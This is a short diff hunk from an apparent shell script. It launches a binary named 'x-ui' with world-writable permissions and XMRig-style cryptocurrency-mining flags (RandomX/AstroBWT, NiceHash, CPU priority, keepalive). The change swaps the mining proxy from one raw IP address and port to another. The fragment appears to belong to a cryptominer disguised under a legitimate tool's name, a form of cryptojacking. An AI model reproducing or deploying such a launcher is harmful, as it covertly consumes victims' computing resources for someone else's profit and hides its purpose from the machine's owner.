@@ -24,4 +24,4 @@ chmod 777 x-ui
 --threads=$cpu --cpu-priority=2 \
 --astrobwt-avx2 --nicehash \
 --randomx-wrmsr=-1 --no-huge-pages \
---keepalive --proxy=45.81.225.80:55229
+--keepalive --proxy=173.82.202.224:11028
